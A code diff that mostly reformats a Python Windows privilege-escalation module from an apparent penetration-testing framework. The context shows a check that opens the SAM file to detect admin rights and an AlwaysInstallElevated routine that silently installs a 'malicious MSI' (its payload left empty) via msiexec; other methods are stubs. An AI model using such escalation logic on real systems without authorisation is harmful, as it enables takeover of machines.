@@ -3,19 +3,20 @@
 Windows 权限提升模块
 """
 
-from .uac_bypass import UACBypass
-from .token_manipulation import TokenManipulation
+import logging
+import platform
+from typing import Any, Dict, List, Optional
+
 from ..base import (
     BasePrivilegeEscalation,
     EscalationConfig,
-    EscalationResult,
     EscalationMethod,
-    PrivilegeLevel,
+    EscalationResult,
     EscalationVector,
+    PrivilegeLevel,
 )
-from typing import Optional, List, Dict, Any
-import logging
-import platform
+from .token_manipulation import TokenManipulation
+from .uac_bypass import UACBypass
 
 logger = logging.getLogger(__name__)
 
@@ -29,9 +30,9 @@ class WindowsPrivilegeEscalation(BasePrivilegeEscalation):
     Warning: 仅限授权渗透测试使用！
     """
 
-    name = 'windows_privesc'
-    description = 'Windows Privilege Escalation Module'
-    platform = 'windows'
+    name = "windows_privesc"
+    description = "Windows Privilege Escalation Module"
+    platform = "windows"
     supported_methods = [
         EscalationMethod.UAC_BYPASS,
         EscalationMethod.TOKEN_IMPERSONATION,
@@ -59,15 +60,16 @@ class WindowsPrivilegeEscalation(BasePrivilegeEscalation):
             if is_admin:
                 # 检查是否为 SYSTEM
                 import os
-                username = os.environ.get('USERNAME', '').upper()
-                if username == 'SYSTEM':
+
+                username = os.environ.get("USERNAME", "").upper()
+                if username == "SYSTEM":
                     return PrivilegeLevel.SYSTEM
 
                 # 检查是否为完整管理员（非 UAC 受限）
                 # 尝试访问受保护的路径
                 try:
-                    test_path = 'C:\\Windows\\System32\\config\\SAM'
-                    with open(test_path, 'rb'):
+                    test_path = "C:\\Windows\\System32\\config\\SAM"
+                    with open(test_path, "rb"):
                         pass
                     return PrivilegeLevel.HIGH
                 except (PermissionError, FileNotFoundError):
@@ -87,9 +89,7 @@ class WindowsPrivilegeEscalation(BasePrivilegeEscalation):
         result = enumerator.enumerate()
 
         if result.success:
-            self._vectors = [
-                EscalationVector(**v) for v in result.vectors
-            ]
+            self._vectors = [EscalationVector(**v) for v in result.vectors]
             return result.vectors
         else:
             return []
@@ -97,6 +97,7 @@ class WindowsPrivilegeEscalation(BasePrivilegeEscalation):
     def escalate(self, method: Optional[EscalationMethod] = None) -> EscalationResult:
         """执行提权"""
         import time
+
         start_time = time.time()
         from_level = self.check_current_privilege()
 
@@ -125,7 +126,7 @@ class WindowsPrivilegeEscalation(BasePrivilegeEscalation):
                     method=method,
                     from_level=from_level,
                     to_level=from_level,
-                    error=f"Unsupported method: {method.value}"
+                    error=f"Unsupported method: {method.value}",
                 )
 
             result.from_level = from_level
@@ -144,7 +145,7 @@ class WindowsPrivilegeEscalation(BasePrivilegeEscalation):
                 from_level=from_level,
                 to_level=from_level,
                 error=str(e),
-                duration=time.time() - start_time
+                duration=time.time() - start_time,
             )
 
     def _execute_potato(self) -> EscalationResult:
@@ -156,7 +157,7 @@ class WindowsPrivilegeEscalation(BasePrivilegeEscalation):
             method=EscalationMethod.POTATO,
             from_level=self.current_level,
             to_level=self.current_level,
-            error="Potato exploit requires additional tools (e.g., PrintSpoofer, JuicyPotato)"
+            error="Potato exploit requires additional tools (e.g., PrintSpoofer, JuicyPotato)",
         )
 
     def _exploit_always_install_elevated(self) -> EscalationResult:
@@ -168,17 +169,15 @@ class WindowsPrivilegeEscalation(BasePrivilegeEscalation):
         try:
             # 创建恶意 MSI
             # 这里仅作为示例框架
-            msi_content = b''  # 需要实际的 MSI payload
+            msi_content = b""  # 需要实际的 MSI payload
 
-            with tempfile.NamedTemporaryFile(suffix='.msi', delete=False) as f:
+            with tempfile.NamedTemporaryFile(suffix=".msi", delete=False) as f:
                 msi_path = f.name
                 f.write(msi_content)
 
             # 执行 MSI
             result = subprocess.run(
-                ['msiexec', '/quiet', '/qn', '/i', msi_path],
-                capture_output=True,
-                timeout=60
+                ["msiexec", "/quiet", "/qn", "/i", msi_path], capture_output=True, timeout=60
             )
 
             # 清理
@@ -190,7 +189,7 @@ class WindowsPrivilegeEscalation(BasePrivilegeEscalation):
                     method=EscalationMethod.ALWAYS_INSTALL_ELEVATED,
                     from_level=self.current_level,
                     to_level=PrivilegeLevel.SYSTEM,
-                    output="AlwaysInstallElevated exploit successful"
+                    output="AlwaysInstallElevated exploit successful",
                 )
 
         except Exception as e:
@@ -199,7 +198,7 @@ class WindowsPrivilegeEscalation(BasePrivilegeEscalation):
                 method=EscalationMethod.ALWAYS_INSTALL_ELEVATED,
                 from_level=self.current_level,
                 to_level=self.current_level,
-                error=str(e)
+                error=str(e),
             )
 
         return EscalationResult(
@@ -207,7 +206,7 @@ class WindowsPrivilegeEscalation(BasePrivilegeEscalation):
             method=EscalationMethod.ALWAYS_INSTALL_ELEVATED,
             from_level=self.current_level,
             to_level=self.current_level,
-            error="AlwaysInstallElevated exploit failed"
+            error="AlwaysInstallElevated exploit failed",
         )
 
     def _exploit_unquoted_path(self) -> EscalationResult:
@@ -218,12 +217,12 @@ class WindowsPrivilegeEscalation(BasePrivilegeEscalation):
             method=EscalationMethod.UNQUOTED_SERVICE_PATH,
             from_level=self.current_level,
             to_level=self.current_level,
-            error="Unquoted service path exploit not implemented"
+            error="Unquoted service path exploit not implemented",
         )
 
 
 __all__ = [
-    'WindowsPrivilegeEscalation',
-    'UACBypass',
-    'TokenManipulation',
+    "WindowsPrivilegeEscalation",
+    "UACBypass",
+    "TokenManipulation",
 ]
